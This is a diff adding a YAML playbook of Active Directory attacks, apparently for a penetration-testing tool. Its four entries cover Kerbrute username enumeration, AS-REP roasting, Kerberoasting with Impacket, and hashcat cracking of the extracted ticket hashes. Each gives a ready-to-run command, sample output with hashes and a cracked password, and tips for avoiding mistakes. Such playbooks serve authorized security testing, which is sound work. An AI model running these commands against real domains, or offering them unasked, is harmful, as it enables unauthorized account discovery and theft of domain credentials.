@@ -1,0 +1,51 @@
+- id: "kerberos-user-enum"
+  title: "Kerberos User Enumeration (Pre-Auth Probing)"
+  phase: "reconnaissance"
+  purpose: "Validate valid Active Directory usernames by sending TGT requests without credentials using Kerbrute, without causing account lockouts."
+  command: "kerbrute userenum --dc {{TARGET}} -d {{DOMAIN|corp.local}} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
+  expected_output:
+    - "[+] VALID USERNAME:       svc-backup@{{DOMAIN|corp.local}}"
+    - "[+] VALID USERNAME:       administrator@{{DOMAIN|corp.local}}"
+    - "[+] VALID USERNAME:       jdoe@{{DOMAIN|corp.local}}"
+  common_mistakes:
+    - "Targeting a secondary server instead of the primary Domain Controller (KDC)."
+    - "Specifying the realm or domain name in lowercase when strict Kerberos protocols expect UPPERCASE realm names."
+
+- id: "kerberos-asreproast"
+  title: "AS-REP Roasting (No Pre-Authentication Accounts)"
+  phase: "exploitation"
+  purpose: "Request AS-REP encryption tickets for domain accounts configured with 'Do not require Kerberos preauthentication' (DONT_REQ_PREAUTH) and extract hashes for offline cracking."
+  command: "impacket-GetNPUsers {{DOMAIN|corp.local}}/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip {{TARGET}} -no-pass"
+  expected_output:
+    - "[*] Getting TGT for svc-backup"
+    - "$krb5asrep$23$svc-backup@{{DOMAIN|corp.local}}:e7b415a77f7f0a9c...$04d3e527d..."
+    - "[+] Output written to asrep_hashes.txt"
+  common_mistakes:
+    - "Assuming all accounts are vulnerable (only accounts explicitly marked without preauth will respond with AS-REP)."
+    - "Using hashcat mode 13100 (Kerberoast) instead of mode 18200 (AS-REP Roast krb5asrep)."
+
+- id: "kerberos-kerberoasting"
+  title: "Kerberoasting (Service Principal Names - SPNs)"
+  phase: "exploitation"
+  purpose: "Request Ticket Granting Service (TGS) tickets for user accounts registered with Service Principal Names (SPNs) using any valid authenticated domain credential, extracting TGS hashes for offline cracking."
+  command: "impacket-GetUserSPNs {{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{TARGET}} -request -outputfile kerberoast_hashes.txt"
+  expected_output:
+    - "ServicePrincipalName               Name      MemberOf                   PasswordLastSet"
+    - "MSSQLSvc/sql.corp.local:1433       svc_sql   CN=Domain Users,CN=Users   2023-04-12"
+    - "$krb5tgs$23$*svc_sql*CORP.LOCAL*$MSSQLSvc/sql.corp.local:1433*$4b28f8f..."
+    - "[+] Output written to kerberoast_hashes.txt"
+  common_mistakes:
+    - "Kerberoasting without valid domain user credentials (requires at least standard unprivileged domain user access)."
+    - "Targeting machine accounts (names ending in '$') whose 120-character computer passwords cannot be cracked offline."
+
+- id: "kerberos-crack-hashes"
+  title: "Offline Hash Cracking (Hashcat)"
+  phase: "exploitation"
+  purpose: "Crack extracted Kerberos TGS (mode 13100) or AS-REP (mode 18200) ticket hashes against wordlists like rockyou.txt."
+  command: "hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"
+  expected_output:
+    - "$krb5tgs$23$*svc_sql*CORP.LOCAL*...:Winter2023!$"
+    - "Session..........: hashcat\nStatus...........: Cracked"
+  common_mistakes:
+    - "Using wrong GPU drivers or not utilizing rule files (e.g., best64.rule) to catch common password transformations."
+    - "Not recording cracked credentials directly in your project credentials vault."
